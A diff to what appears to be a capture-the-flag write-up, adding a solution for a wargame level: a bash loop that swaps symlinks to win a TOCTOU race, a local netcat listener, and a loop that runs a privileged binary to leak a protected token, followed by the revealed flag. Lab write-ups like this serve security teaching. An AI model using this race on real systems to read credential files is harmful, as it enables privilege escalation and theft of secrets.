@@ -53,4 +53,18 @@ Run `tcpdump -A -r capture.pcap` for ASCII mode or
 > 7f represents a backspace, we get `backd00Rmate` as the password
 
 ## Exercice 10
-- [] TODO
+Uses a TOC TOU Race condition exploit
+We keep swapping between 2 symlinks to bypass the check 
+Run 3 terminals
+- Term 1: All in /tmp : Create a script `swap_ln`
+``` bash
+#!/bin/bash
+while true; do
+        ln -sf /tmp/dummy /tmp/exploit
+        ln -sf /home/flag10/token /tmp/exploit
+done
+```
+- Term 2: run `nc -lk 18211` (listen on port 18211) to read the token
+- Term 3: `while true; do /home/flag10/flag10 /tmp/exploit 127.0.0.1; done`
+
+> Solution : `615a2ce1-b2b5-4c76-8eed-8aa5c4015c27`, run su flag10 and paste it
